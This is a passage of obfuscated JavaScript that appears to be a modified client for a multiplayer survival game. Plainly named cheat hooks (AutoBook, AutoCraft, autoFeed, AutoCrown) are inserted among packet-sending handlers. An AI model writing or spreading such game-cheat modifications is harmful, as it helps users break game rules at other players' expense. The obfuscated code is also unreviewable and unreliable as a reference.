							ᐃⲆΔ.angle = ⲆᐃΔ;
							ᐃⲆΔ.ⵠⲆᐃ = ⲆⵠⵠᐃⲆ;
							break;
						case 51:
							ᐃⲆΔ = ⵠᐃᐃᐃ[ⵠ[196]][ⵠΔⵠΔ][0];
							ᐃⲆΔ.angle = ⲆᐃΔ;
							ᐃⲆΔ.ⵠⲆᐃ = ⲆᐃΔⲆⲆ;
							break;
						case 52:
							ᐃⲆΔ = ⵠᐃᐃᐃ[ⵠ[196]][ⲆᐃᐃⲆ][Δᐃᐃⵠ];
							ᐃⲆΔ.angle = ⲆᐃΔ;
							ᐃⲆΔ.ⵠⲆᐃ = ⵠⲆⲆⵠᐃ;
							break;
						case 55:
							ᐃⲆΔ = ⵠᐃᐃᐃ["c"][ΔⲆⵠⲆ][Δᐃᐃᐃ];
							ᐃⲆΔ.angle = ⲆᐃΔ;
							ᐃⲆΔ.ⵠⲆᐃ = true;
							break;
						case 56:
							ᐃⲆΔ = ⵠᐃᐃᐃ["m"][0][ⵠΔⲆⵠ];
							ᐃⲆΔ.angle = ⲆᐃΔ;
							ᐃⲆΔ.ⵠⲆᐃ = ᐃⲆᐃᐃⲆ;
							break;
						case 57:
							ᐃⲆΔ = ⵠᐃᐃᐃ["m"][ΔᐃᐃⲆ][0];
							ᐃⲆΔ.angle = ⲆᐃΔ;
							ᐃⲆΔ.ⵠⲆᐃ = ΔᐃⲆⵠⵠ;
							break;
						case 58:
							ᐃⲆΔ = ⵠᐃᐃᐃ["m"][2][Ⲇᐃᐃᐃ];
							ᐃⲆΔ.angle = ⲆᐃΔ;
							ᐃⲆΔ.ⵠⲆᐃ = true;
							break
					}
					if (ⲆⲆⵠⲆ.loaded && ⲆⲆⵠⲆ.ⲆΔΔᐃⵠ && ᐃⲆΔ) ⲆⲆⵠⲆ.Δᐃⵠ(ⵠΔΔᐃᐃ[ᐃᐃⲆⲆ + ⵠᐃⲆⲆ] & ΔⲆⵠ, ⵠⲆΔΔ[ᐃΔ], ᐃⲆΔ.x, ᐃⲆΔ.y)
				}
			};
			this.ⵠᐃΔΔⲆ = function() {
				this.ΔⲆⲆΔ[ᐃⵠΔΔ](ΔᐃⲆⲆⲆⲆᐃ[ΔⲆⵠΔᐃ].stringify([35, ᐃᐃΔ.ⵠᐃΔΔⲆ.ⲆⵠⵠΔ, ᐃᐃΔ.ⵠᐃΔΔⲆ.ⲆⲆΔᐃⵠ]))
			};
			this.ⲆⵠⵠΔⵠᐃΔⵠⵠ = function(ΔΔΔⵠ, ᐃⵠⵠⵠ) {
				this.ΔⲆⲆΔ[ᐃⵠΔΔ](ΔᐃⲆⲆⲆⲆᐃ[ⵠᐃⲆΔⲆΔⲆ].stringify([30, ᐃⵠⵠⵠ, ΔΔΔⵠ.ⲆⵠⵠΔ, ΔΔΔⵠ.ⲆⲆΔᐃⵠ]))
			};
			this.ⵠᐃⵠⲆⵠⲆᐃ = function(ᐃΔᐃΔ, ᐃⵠⵠ, ᐃΔᐃ) {
				ᐃⵠⵠ ? this.ΔⲆⲆΔ[ᐃⵠΔΔ](ΔᐃⲆⲆⲆⲆᐃ[ⵠᐃⲆΔⲆΔⲆ].stringify([ⵠᐃⵠΔᐃ, ᐃⵠⵠ, ᐃΔᐃΔ.ⲆⵠⵠΔ, ᐃΔᐃΔ.ⲆⲆΔᐃⵠ])) : this.ΔⲆⲆΔ[ᐃⵠΔΔ](ΔᐃⲆⲆⲆⲆᐃ[ΔⲆΔᐃᐃⲆⵠ].stringify([25, ᐃΔᐃ, ᐃΔᐃΔ.ⲆⵠⵠΔ, ᐃΔᐃΔ.ⲆⲆΔᐃⵠ]))
			};
			this.ⵠᐃΔᐃⲆΔΔⲆⵠ = function(ᐃΔᐃΔ) {
				this.ΔⲆⲆΔ[ᐃⵠΔΔ](ᐃᐃⵠΔᐃ[ᐃᐃᐃⵠⲆ].stringify([ⵠᐃᐃΔⲆ, ᐃΔᐃΔ.ⲆⵠⵠΔ, ᐃΔᐃΔ.ⲆⲆΔᐃⵠ]))
			};
			this.ⲆᐃⲆΔᐃΔⲆΔᐃ = function(ᐃΔᐃᐃⲆⲆΔᐃⲆ) {
				this.ΔⲆⲆΔ[ᐃⵠΔΔ](ᐃᐃⵠΔᐃ[ᐃⲆΔᐃⵠᐃⲆ].stringify([32, ᐃΔᐃᐃⲆⲆΔᐃⲆ]))
			};
			this.ⵠⵠΔΔᐃΔᐃΔⵠ = function(Ⲇⵠⵠⵠⵠ) {
				this.ΔⲆⲆΔ[ᐃⵠΔΔ](ⲆⲆΔᐃᐃᐃᐃ[ΔⲆⵠΔᐃ].stringify([29, Ⲇⵠⵠⵠⵠ.ⲆⵠⵠΔ, Ⲇⵠⵠⵠⵠ.ⲆⲆΔᐃⵠ]))
			};
			this.ᐃⲆᐃΔⵠᐃⵠⲆⵠ = function(ⲆΔΔⲆ, ᐃⵠⵠⵠ) {
				this.ΔⲆⲆΔ[ᐃⵠΔΔ](ⵠⲆⵠⲆⲆ[ᐃᐃᐃⵠⲆ].stringify([27, ᐃⵠⵠⵠ, ⲆΔΔⲆ.ⲆⵠⵠΔ, ⲆΔΔⲆ.ⲆⲆΔᐃⵠ, ⲆΔΔⲆ.type]))
			};
			this.ᐃΔᐃΔⵠⵠᐃⵠⲆ = function(ΔⲆᐃⲆⵠ, ᐃⵠⵠⵠ) {
				this.ΔⲆⲆΔ[ᐃⵠΔΔ](ⵠⲆⵠⲆⲆ[ᐃᐃᐃⵠⲆ].stringify([ᐃⲆΔΔΔᐃᐃ, ᐃⵠⵠⵠ, ΔⲆᐃⲆⵠ.ⲆⵠⵠΔ, ΔⲆᐃⲆⵠ.ⲆⲆΔᐃⵠ]))
			};
			this.ⲆⲆΔΔΔⲆΔⲆᐃ = function(ⲆᐃⲆΔ, ᐃΔ, ᐃⵠⵠⵠ) {
				this.ΔⲆⲆΔ[ᐃⵠΔΔ](ⲆⲆΔᐃᐃᐃᐃ[ⵠᐃⲆΔⲆΔⲆ].stringify([1, ᐃΔ, ᐃⵠⵠⵠ, ⲆᐃⲆΔ.ⲆⵠⵠΔ, ⲆᐃⲆΔ.ⲆⲆΔᐃⵠ]))
			};
			this.ⵠᐃᐃⲆⲆΔⲆ = function(ⲆΔΔⲆ) {
				this.ΔⲆⲆΔ[ᐃⵠΔΔ](ᐃᐃⵠΔᐃ[ᐃᐃᐃⵠⲆ].stringify([37, ⲆΔΔⲆ.ⲆⵠⵠΔ, ⲆΔΔⲆ.ⲆⲆΔᐃⵠ, ⲆΔΔⲆ.type]))
			};
			this.ᐃΔᐃⲆⵠⵠᐃᐃⲆ = function(ΔΔΔⵠ) {
				this.ΔⲆⲆΔ[ᐃⵠΔΔ](ᐃᐃⵠΔᐃ[ᐃᐃᐃⵠⲆ].stringify([4, ΔΔΔⵠ.ⲆⵠⵠΔ, ΔΔΔⵠ.ⲆⲆΔᐃⵠ]))
			};
			this.ⲆⵠⵠΔΔⵠⵠⲆΔ = function(ⲆᐃⲆΔ) {
				this.ΔⲆⲆΔ[ᐃⵠΔΔ](ᐃᐃⵠΔᐃ[ᐃᐃᐃⵠⲆ].stringify([8, ⲆᐃⲆΔ.ⲆⵠⵠΔ, ⲆᐃⲆΔ.ⲆⲆΔᐃⵠ]))
			};
			this.ⲆⲆⵠΔᐃⵠⵠᐃⵠ = function(ⲆᐃⲆΔ) {
				this.ΔⲆⲆΔ[ᐃⵠΔΔ](ᐃΔΔΔⵠᐃᐃ[ⵠᐃΔⵠⵠΔΔ].stringify([20, ⲆᐃⲆΔ.ⲆⵠⵠΔ, ⲆᐃⲆΔ.ⲆⲆΔᐃⵠ]))
			};
			this.ⲆⵠΔΔⵠᐃΔᐃⵠ = function(ⲆᐃⲆΔ) {
				this.ΔⲆⲆΔ[ᐃⵠΔΔ](ΔΔⲆⵠⲆⵠᐃ[ⵠᐃⲆΔᐃᐃⵠ].stringify([3, ⲆᐃⲆΔ.ⲆⲆΔᐃⵠ]))
			};
			this.ᐃⵠⲆⲆΔᐃᐃ = function(ⲆⲆᐃⲆⵠⲆᐃ) {
				ᐃᐃᐃ.ΔⲆⲆΔ[ᐃⵠΔΔ](ᐃⵠᐃⵠⵠⵠⵠ[ᐃⲆΔᐃⵠᐃⲆ].stringify([23, ᐃᐃΔ.ⵠΔΔᐃⵠ.id, ᐃᐃΔ.ⲆᐃⵠⲆΔ[ⲆⲆᐃⲆⵠⲆᐃ]]))
			};
			this.ΔᐃᐃΔΔΔΔᐃⲆ = function() {
				ᐃᐃᐃ.ΔⲆⲆΔ[ᐃⵠΔΔ](ᐃⵠⲆᐃᐃⵠΔ[ΔᐃΔᐃᐃΔⵠ].stringify([ⲆⲆⲆⵠⲆ, ᐃᐃΔ.ⵠΔΔᐃⵠ.ⲆⵠⵠΔ, ᐃᐃΔ.ⵠΔΔᐃⵠ.id]))
			};
			this.ⲆⵠⲆⵠᐃⲆᐃ = function() {
				ᐃᐃᐃ.ΔⲆⲆΔ[ᐃⵠΔΔ](ⲆⵠΔⲆᐃΔⵠ[Δᐃⵠᐃᐃᐃⵠ].stringify([ⵠⲆⵠⲆⵠ]))
			};
			this.ᐃᐃⵠΔΔⲆⵠⵠᐃ = function() {
				ᐃᐃᐃ.ΔⲆⲆΔ[ᐃⵠΔΔ](ⲆⵠΔⲆᐃΔⵠ[ᐃⲆΔᐃⵠᐃⲆ].stringify([19, ᐃᐃΔ.ⵠΔΔᐃⵠ.id]));
				if (document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[324])[ΔᐃⲆⵠⲆⵠΔ[290]] == "LOCK") {
					ᐃᐃΔ.ⵠΔΔᐃⵠ.lock = ΔᐃᐃⲆ;
					document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[324])[ΔᐃⲆⵠⲆⵠΔ[290]] = "UNLOCK"
				} else {
					ᐃᐃΔ.ⵠΔΔᐃⵠ.lock = 0;
					document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[324])[ΔᐃⲆⵠⲆⵠΔ[290]] = "LOCK"
				}
			};
			this.ΔⲆᐃ = function(ΔⲆⵠΔ, ⲆⲆⲆⵠ, ᐃⲆᐃᐃΔᐃᐃΔΔ) {
				var ⵠΔΔᐃᐃ = new Uint16Array(ΔⲆⵠΔ);
				ᐃⲆᐃᐃΔᐃᐃΔΔ && ⲆⲆⲆ.ᐃΔΔⲆᐃⵠⲆⵠⲆ();
				var ΔⲆΔᐃⲆ = (ⲆⲆⲆⵠ.length - ᐃⲆⵠᐃΔ) / 18;
				for (var ⵠᐃ = 0; ΔⲆΔᐃⲆ > ⵠᐃ; ⵠᐃ++) {
					var ᐃⵠⲆⲆⵠᐃᐃ = Ⲇⵠⵠᐃ + ⵠᐃ * ⲆⲆᐃᐃΔⵠⵠ;
					var ⵠΔΔΔᐃᐃⲆ = 1 + ⵠᐃ * ΔⵠᐃΔΔΔⵠ;
					var ⲆⵠⵠΔ = ⲆⲆⲆⵠ[ᐃⵠⲆⲆⵠᐃᐃ];
					var ⲆⵠⲆΔ = ⵠΔΔᐃᐃ[ⵠΔΔΔᐃᐃⲆ + 1];
					var ᐃΔ = ⵠΔΔᐃᐃ[ⵠΔΔΔᐃᐃⲆ + ⵠᐃΔⵠ];
					var ⲆᐃΔΔ = ⲆⵠⵠΔ * ⲆⲆⲆ.ⵠᐃᐃⲆΔⲆΔ + ᐃΔ;
					if (ⲆⵠⲆΔ & ⵠⵠⵠⲆ.ⲆΔΔⵠⵠΔΔⲆᐃ) {
						ⲆⲆⲆ.ΔⲆⵠⲆⲆⵠΔⵠΔ(ⲆᐃΔΔ);
						continue
					}
					var ᐃᐃⵠⵠ = ⵠΔΔᐃᐃ[ⵠΔΔΔᐃᐃⲆ + ᐃⲆⵠᐃ];
					var Δⵠ = ⵠΔΔᐃᐃ[ⵠΔΔΔᐃᐃⲆ + 3];
					var ⲆⵠⲆ = ⵠΔΔᐃᐃ[ⵠΔΔΔᐃᐃⲆ + ᐃⵠⵠΔ];
					var Ⲇⵠᐃ = ⵠΔΔᐃᐃ[ⵠΔΔΔᐃᐃⲆ + ⵠᐃΔⵠᐃ];
					var ᐃᐃΔᐃᐃ = ⵠΔΔᐃᐃ[ⵠΔΔΔᐃᐃⲆ + ⲆⲆⵠⲆⵠ];
					var ΔⵠΔⵠⲆ = ⵠΔΔᐃᐃ[ⵠΔΔΔᐃᐃⲆ + 8];
					var ⲆᐃΔ = ⵠⵠⵠΔ * (Math.PI * (ⲆⲆⲆⵠ[ᐃⵠⲆⲆⵠᐃᐃ + 1] / ⲆᐃᐃΔᐃᐃⵠ));
					if (!ⲆⲆⲆ.ᐃⲆⵠⵠⲆ[ⲆᐃΔΔ]) {
						var ᐃⲆΔ = new ΔⲆⵠΔΔⲆⵠ(ᐃᐃⵠⵠ, ⲆⵠⵠΔ, ᐃΔ, Δⵠ, ⲆⵠⲆ, ⲆᐃΔ, ⲆⵠⲆΔ, Ⲇⵠᐃ, ᐃᐃΔᐃᐃ, ΔⵠΔⵠⲆ);
						ⲆⲆⲆ.ᐃⲆⵠⵠⲆ[ⲆᐃΔΔ] = ᐃⲆΔ;
						ⲆⲆⲆ.ΔⲆᐃ[ᐃᐃⵠⵠ].push(ᐃⲆΔ);
						continue
					}
					var ᐃᐃᐃΔ = ⲆⲆⲆ.ᐃⲆⵠⵠⲆ[ⲆᐃΔΔ];
					ᐃᐃᐃΔ.r.x = Δⵠ;
					ᐃᐃᐃΔ.r.y = ⲆⵠⲆ;
					if (ⲆⵠⵠΔ != Δᐃᐃⵠ && ΔΔⲆᐃ.ᐃⵠⵠᐃ(ᐃᐃᐃΔ, ᐃᐃᐃΔ.r) > ᐃⲆⵠᐃᐃ.ⲆⲆΔⵠⲆⵠⲆⵠᐃ) {
						ᐃᐃᐃΔ.x = Δⵠ;
						ᐃᐃᐃΔ.y = ⲆⵠⲆ
					}
					if (ᐃᐃΔ.id !== ᐃᐃᐃΔ.id || ⲆⵠⵠΔ === ᐃⵠΔ) ᐃᐃᐃΔ.ⲆΔⲆⲆΔⲆΔ = ⲆᐃΔ;
					ᐃᐃᐃΔ.action |= ⲆⵠⲆΔ;
					ᐃᐃᐃΔ.info = Ⲇⵠᐃ;
					ᐃᐃᐃΔ.ᐃᐃΔᐃᐃ = ᐃᐃΔᐃᐃ;
					ᐃᐃᐃΔ.ΔⵠΔⵠⲆ = ΔⵠΔⵠⲆ;
					if (ᐃᐃᐃΔ.ⵠⲆᐃ) ᐃᐃᐃΔ.ⵠⲆᐃ(ⲆⵠⲆΔ)
				}
			};
			this.ⲆⲆⵠΔᐃ = function(ΔⲆⵠΔ) {
				this.ΔⵠⵠΔⲆΔⲆ = ᐃⲆⵠⵠΔ;
				var ᐃᐃᐃΔ = new Uint16Array(ΔⲆⵠΔ);
				ᐃᐃΔ.ᐃΔΔⲆⵠ.ⲆⲆⲆΔⵠ(ᐃᐃᐃΔ)
			};
			this.ΔⵠⵠⵠΔΔᐃΔⵠ = function(ⲆᐃⲆΔⲆⵠᐃ) {
				ᐃⲆᐃⲆⲆ !== ΔⵠⲆⵠΔΔⲆ && (ⵠⲆⵠᐃΔ = ΔⵠⲆⵠΔΔⲆ);
				if (0 < ⲆᐃⲆΔⲆⵠᐃ.length) {
					ΔⵠⲆⵠΔΔⲆ = JSON.parse(JSON.stringify(ⵠⲆⵠᐃΔ));
					for (var ⵠᐃ = ⲆΔⵠ; ⵠᐃ < ⲆᐃⲆΔⲆⵠᐃ.length; ⵠᐃ++) {
						var ⲆⲆⵠ = ⲆᐃⲆΔⲆⵠᐃ[ⵠᐃ];
						var ᐃΔⲆᐃⲆᐃΔ = ⵠⲆⵠᐃΔ[ⲆⲆⵠ["item"]];
						if (ⲆᐃΔⲆᐃ === ᐃΔⲆᐃⲆᐃΔ) continue;
						ᐃΔⲆᐃⲆᐃΔ.r = ⲆⲆⵠ["recipe"];
						ᐃΔⲆᐃⲆᐃΔ.w = ⲆⲆⵠ["workbench"];
						ᐃΔⲆᐃⲆᐃΔ.f = ⲆⲆⵠ["fire"];
						ᐃΔⲆᐃⲆᐃΔ.ᐃⲆΔ = ⲆⲆⵠ["water"];
						ᐃΔⲆᐃⲆᐃΔ.e = ⲆⲆⵠ["well"];
						ᐃΔⲆᐃⲆᐃΔ.time = 1 / ⲆⲆⵠ[ⵠ[299]]
					}
				}
			};
			this.ⵠΔᐃⲆᐃⲆᐃ = function(ᐃⲆᐃⵠ) {
				!ᐃⲆᐃⵠ || ᐃⲆᐃⵠ.length === ⵠᐃⲆᐃ ? ᐃᐃΔ.ⵠΔᐃⲆᐃⲆᐃ.message = ⲆⲆⲆⲆᐃ : ᐃᐃΔ.ⵠΔᐃⲆᐃⲆᐃ.message = ΔⵠⵠⲆᐃⲆΔΔⲆ(ᐃⲆᐃⵠ)
			};
			this.ⵠⵠⲆᐃᐃ = function(ᐃⲆᐃⵠ) {
				var ᐃⲆⲆ = ⲆⲆⲆ.ᐃⲆⵠⵠⲆ[ᐃⲆᐃⵠ[1] * ⲆⲆⲆ.ⵠᐃᐃⲆΔⲆΔ];
				if (ᐃⲆⲆ) {
					if (ΔᐃᐃΔ.ⵠᐃᐃⲆᐃ === ⲆⲆⲆ.mode && ᐃⲆⲆ.ⲆⵠⲆᐃ === ΔᐃᐃΔ.ⲆᐃⵠΔᐃⲆΔ) {
						if (!ᐃᐃΔ.ⵠⵠⲆⵠⵠ) ᐃⲆⲆ.text.push(ΔⵠᐃⲆⲆⵠⲆ[Math.floor(Math.random() * ΔⵠᐃⲆⲆⵠⲆ.length)]);
						else {
							if (.5 < Math.random()) ᐃⲆⲆ.text.push(ᐃⲆᐃⵠ[2] + " ..." + ⲆⲆΔΔⲆ);
							else ᐃⲆⲆ.text.push(ⲆⲆΔΔⲆ + "... " + ᐃⲆᐃⵠ[2])
						}
					} else ᐃⲆⲆ.text.push(ᐃⲆᐃⵠ[2])
				}
			};
			this.ⲆᐃⲆᐃᐃΔⲆⲆᐃ = function(ᐃΔ) {
				if (ᐃᐃΔ.ⲆⵠⲆⵠ.ⵠΔᐃⲆⵠ.length === ᐃᐃΔ.ⲆⵠⲆⵠ.max && ⵠⲆⵠᐃΔ[ᐃΔ].ⵠΔᐃⲆ !== ᐃᐃ.ⵠᐃᐃⵠ && -1 == ᐃᐃΔ.ⲆⵠⲆⵠ.ⲆΔⲆⵠⲆ(ⵠⲆⵠᐃΔ[ᐃΔ].ⵠΔᐃⲆ) && !ᐃᐃΔ.ⲆⵠⲆⵠ.ᐃᐃᐃⵠᐃᐃⵠᐃᐃ(ⵠⲆⵠᐃΔ[ᐃΔ].r)) {
					this.ⵠⵠᐃⵠᐃⲆΔ();
					return ᐃⵠΔ
				}
				if (Settings.AutoBook.enabled && getWorldProperty("fast_units")[getUserProperty("uid")].right !== 28 && canSelect(28)) {
					getClientProperty("socket").send(JSON.stringify([Packets.Equip, 28]))
				}
				Settings.AutoCraft.last = arguments[0];
				autoFeed();
				this.ΔⲆⲆΔ[ᐃⵠΔΔ](ᐃᐃΔΔⵠΔⵠ[ⲆΔᐃⵠᐃᐃⵠ].stringify([26, ᐃΔ]));
				return ⲆⵠⲆⲆ
			};
			this.ⵠⵠⵠᐃΔ = function(ⵠΔⵠⵠΔ) {
				ᐃᐃΔ.ⵠΔΔⲆ.ⵠⵠⵠΔⲆⲆⵠᐃⲆ(ⵠΔⵠⵠΔ)
			};
			this.Ⲇⵠⵠⵠⵠ = function(ⵠΔⵠⵠΔ) {
				ᐃᐃΔ.ⵠΔΔⲆ.Ⲇⵠⵠⵠⵠ = ⵠΔⵠⵠΔ;
				ᐃᐃΔ.ⵠΔΔⲆ.ⵠⲆᐃ()
			};
			this.ⵠᐃⲆΔⲆ = function(ⵠΔⵠⵠΔ) {
				ᐃᐃΔ.ⵠΔΔⲆ.ⵠᐃⲆΔⲆ = ⵠΔⵠⵠΔ;
				ᐃᐃΔ.ⵠΔΔⲆ.ⵠⲆᐃ()
			};
			this.ᐃⵠΔᐃᐃΔⵠ = function(ⵠΔⵠⵠΔ) {
				ᐃᐃΔ.ⵠΔΔⲆ.ᐃⵠΔᐃᐃΔⵠ = ⵠΔⵠⵠΔ;
				ᐃᐃΔ.ⵠΔΔⲆ.ⵠⲆᐃ()
			};
			this.ᐃⵠⵠᐃΔⲆᐃⲆⵠ = function(Ⲇⵠ) {
				this.ⲆⲆⵠⲆⲆ(ΔⵠΔ[ⲆⲆΔ.ⲆⲆⲆⲆᐃᐃᐃ])
			};
			this.ΔΔᐃΔΔⵠⲆᐃⲆ = function() {
				ᐃᐃΔ.ⵠΔΔⲆ.ᐃᐃᐃΔΔⲆᐃ()
			};
			this.ᐃⵠΔⲆⵠ = function(ΔΔⲆᐃΔ) {
				ΔⵠⵠⲆ.ᐃⵠΔⲆⵠ.ᐃᐃᐃⵠ = [];
				var ᐃⲆⲆ = ⲆⲆⲆ.ᐃⲆⵠⵠⲆ[ᐃᐃΔ.ⲆᐃΔΔ];
				var Δⵠⵠᐃ = 0;
				for (var ⵠᐃ = 1; ⵠᐃ < ΔΔⲆᐃΔ.length; ⵠᐃ += ⲆΔΔⵠ) {
					var ⵠΔΔᐃ = {
						x: Math.floor(ΔΔⲆᐃΔ[ⵠᐃ] * ⲆⲆⲆ.w / 250),
						y: Math.floor(ΔΔⲆᐃΔ[ⵠᐃ + ⵠΔᐃ] * ⲆⲆⲆ.ⵠⵠᐃ / 250)
					};
					if (ᐃⲆⲆ && !Δⵠⵠᐃ && !ᐃᐃΔ.ⲆΔⵠΔⲆⵠⲆ && 250 > ΔΔⲆᐃ.ᐃⵠⵠᐃ(ⵠΔΔᐃ, ᐃⲆⲆ)) {
						Δⵠⵠᐃ += ΔᐃⲆⵠ;
						continue
					}
					ΔⵠⵠⲆ.ᐃⵠΔⲆⵠ.ᐃᐃᐃⵠ.push(ⵠΔΔᐃ)
				}
			};
			this.ⵠᐃⵠΔᐃⲆⲆⵠΔ = function() {
				ᐃᐃΔ.ⵠᐃΔΔⲆ[ΔᐃⲆⵠⲆⵠΔ[72]] = false;
				ᐃᐃΔ.Ⲇⵠⵠⵠᐃ.enabled = false;
				ᐃᐃΔ.Ⲇⵠⵠⵠᐃ.ΔⲆΔⲆΔ = -1;
				ᐃᐃΔ.Ⲇⵠⵠⵠᐃ.label = null;
				ᐃᐃΔ.Ⲇⵠⵠⵠᐃ.ᐃⲆᐃΔᐃᐃⵠ = null;
				ᐃᐃΔ.Ⲇⵠⵠⵠᐃ.now = -ΔⲆᐃᐃ;
				if (Settings.AutoCrown.enabled && autoCrownReady) {
					autoCrownReady = false;
					getClientProperty("socket").send(JSON.stringify([Packets.Equip, 79]));
					if (getHammer()) getClientProperty("socket").send(JSON.stringify([Packets.Equip, getHammer()]));
					setTimeout((() => autoCrownReady = true), 5e3)
				}
														if (Settings.XDLOLXD.enabled && autoCrownReady) {
					autoCrownReady = false;
					getClientProperty("socket").send(JSON.stringify([Packets.Equip, 79]));
					if (getHammer()) getClientProperty("socket").send(JSON.stringify([Packets.Equip, getHammer()]));
					setTimeout((() => autoCrownReady = true), 5e3)
				}
			};
			this.Ⲇⵠⵠⵠᐃ = function(ⵠⵠⲆΔⲆⲆⲆⲆᐃ) {
				ΔᐃᐃΔ.ⵠΔᐃᐃΔΔᐃ = ⵠⵠⲆΔⲆⲆⲆⲆᐃ;
				ᐃᐃΔ.Ⲇⵠⵠⵠᐃ.enabled = true;
				ᐃᐃΔ.Ⲇⵠⵠⵠᐃ.ΔⲆΔⲆΔ = (new Date).getTime();
				ᐃᐃΔ.Ⲇⵠⵠⵠᐃ.label = null;
				ᐃᐃΔ.Ⲇⵠⵠⵠᐃ.now = -ΔⲆⵠ;
				var ᐃᐃᐃⲆ = [ᐃᐃ.ΔΔΔⵠΔ, ᐃᐃ.ᐃⵠⵠⵠᐃ, ᐃᐃ.ⵠΔⲆⲆᐃ, ᐃᐃ.ΔΔⵠᐃᐃ, ᐃᐃ.ⲆᐃⵠΔᐃ, ᐃᐃ.ⵠᐃⲆⵠΔ, ᐃᐃ.ᐃΔⵠᐃⵠ, ᐃᐃ.ⵠⵠᐃⲆⲆ, ᐃᐃ.ⲆⵠⵠᐃΔ, ᐃᐃ.ᐃⲆⲆᐃⲆ, ᐃᐃ.ⵠⲆⵠⲆᐃ, ᐃᐃ.ⲆᐃⲆⲆΔ, ᐃᐃ.ΔⵠΔΔⲆ, ᐃᐃ.ⲆⲆⵠΔⲆ, ᐃᐃ.ⵠⵠⲆΔⲆ, ᐃᐃ.ΔᐃΔΔΔ, ᐃᐃ.ⲆⲆΔᐃΔ, ᐃᐃ.ΔⵠⲆⲆᐃ, ᐃᐃ.ⲆⲆⵠᐃⵠ, ᐃᐃ.ΔⲆⲆΔᐃ, ᐃᐃ.ᐃᐃΔⲆΔ, ᐃᐃ.ⲆᐃⵠⵠΔ, ᐃᐃ.ⲆΔΔⵠⵠ, ᐃᐃ.ⵠΔⲆΔΔ, ᐃᐃ.ⵠⲆᐃⵠᐃ, ᐃᐃ.ΔΔⵠⵠⲆ, ᐃᐃ.ΔⲆᐃⵠⲆ, ᐃᐃ.ⵠᐃΔⲆⵠ, ᐃᐃ.ᐃΔⲆᐃΔ, ᐃᐃ.ᐃⲆⵠⲆⵠ, ᐃᐃ.ᐃⵠΔⵠΔ, ᐃᐃ.ⲆⲆᐃᐃΔ, ᐃᐃ.ⵠΔΔⵠⵠ, ᐃᐃ.ᐃᐃΔⵠᐃ, ᐃᐃ.ⵠⲆⲆⲆΔ, ᐃᐃ.ΔᐃⵠΔⲆ, ᐃᐃ.ⲆΔⲆⵠⵠ, ᐃᐃ.ⲆᐃⵠᐃⲆ, ᐃᐃ.ⲆⵠⵠΔᐃ, ᐃᐃ.ᐃᐃᐃⵠΔ, ᐃᐃ.ⵠΔⲆⵠΔ, ᐃᐃ.ΔⵠᐃⵠⲆ, ᐃᐃ.ΔᐃⲆΔⲆ, ᐃᐃ.ⲆⵠᐃⵠΔ, ᐃᐃ.ΔΔⲆⵠⲆ, ᐃᐃ.ⵠⲆⲆΔⲆ, ᐃᐃ.ⵠⲆⵠΔᐃ, ᐃᐃ.ⵠⲆᐃΔⲆ, ᐃᐃ.ΔΔᐃⲆΔ, ᐃᐃ.ᐃΔⲆᐃᐃ, ᐃᐃ.ⵠΔᐃⵠΔ];
				for (var ⵠᐃ = ⵠⲆᐃⵠ; ⵠᐃ < ᐃᐃᐃⲆ.length; ⵠᐃ++) {
					var ᐃΔ = ᐃᐃΔ.ⲆⵠⲆⵠ.ⲆΔⲆⵠⲆ(ᐃᐃᐃⲆ[ⵠᐃ]); - 1 != ᐃΔ && ᐃᐃΔ.ⲆⵠⲆⵠ.ᐃⲆΔⲆΔⲆΔ(ᐃᐃᐃⲆ.length[ⵠᐃ], ᐃΔ)
				}
				ᐃᐃΔ.ⵠΔΔⲆ.ᐃᐃᐃΔΔⲆᐃ()
			};
			this.ΔⲆᐃᐃⵠⲆΔⵠⲆ = function(ᐃΔ, ΔⵠⵠⵠⲆΔⵠⲆΔ, ⲆⵠⲆⲆⵠΔⵠⵠⵠ) {
				this.ΔⲆᐃⵠⵠⲆΔ(ᐃΔ, 256 * ΔⵠⵠⵠⲆΔⵠⲆΔ + ⲆⵠⲆⲆⵠΔⵠⵠⵠ)
			};
			this.ΔⲆᐃⵠⵠⲆΔ = function(ᐃΔ, ᐃⵠⵠⵠ) {
				ᐃᐃΔ.ⵠΔΔⲆ.ᐃΔᐃᐃ = Settings.Equip.enabled ? ᐃᐃΔ.ⲆⵠⲆⵠ.ᐃⵠⵠⵠ[ᐃᐃΔ.ⵠΔΔⲆ.ᐃΔᐃᐃ] -1 ? ᐃᐃΔ.ⵠΔΔⲆ.ᐃΔᐃᐃ : -1 : -1;
				ᐃᐃΔ.ⲆⵠⲆⵠ.ΔⵠⲆΔᐃⵠΔ(ᐃΔ, ᐃⵠⵠⵠ, ᐃᐃΔ.ⲆⵠⲆⵠ.ⲆΔⲆⵠⲆ(ᐃΔ));
				ᐃᐃΔ.ⵠΔΔⲆ.ⵠⲆᐃ()
			};
			this.ΔᐃᐃᐃⲆⵠⵠΔΔ = function(ᐃΔ) {
				ᐃᐃΔ.ⵠΔΔⲆ.ᐃΔᐃᐃ = Settings.Equip.enabled ? ᐃᐃΔ.ⲆⵠⲆⵠ.ᐃⵠⵠⵠ[ᐃᐃΔ.ⵠΔΔⲆ.ᐃΔᐃᐃ] -1 ? ᐃᐃΔ.ⵠΔΔⲆ.ᐃΔᐃᐃ : -1 : -1;;
				ᐃᐃΔ.ᐃⲆⲆⵠᐃ.wait = true;
				var ΔΔΔⵠⵠ = ᐃᐃΔ.ⲆⵠⲆⵠ.ⲆΔⲆⵠⲆ(ᐃΔ);
				ᐃᐃΔ.ⲆⵠⲆⵠ.ΔⵠⲆΔᐃⵠΔ(ᐃΔ, ⵠΔⵠΔ, ΔΔΔⵠⵠ);
				ΔΔΔⵠⵠ >= 0 && !ᐃᐃΔ.ⲆⵠⲆⵠ.ᐃⵠⵠⵠ[ᐃΔ] && ᐃᐃΔ.ⵠΔΔⲆ.ⵠⲆᐃ();
				ᐃΔ == ᐃᐃ.ⲆΔᐃⲆᐃ && (ᐃᐃΔ.ⲆᐃⵠⲆΔ = [ᐃᐃΔ.id])
			};
			this.ᐃⲆΔΔⲆᐃⲆᐃⲆ = function() {
				this.ΔⲆⲆΔ[ᐃⵠΔΔ](ΔᐃⲆⲆⲆⲆᐃ[ΔⲆⵠΔᐃ].stringify([6]))
			};
			this.ΔⲆᐃⲆⵠⵠᐃᐃΔ = function(ΔᐃΔ) {
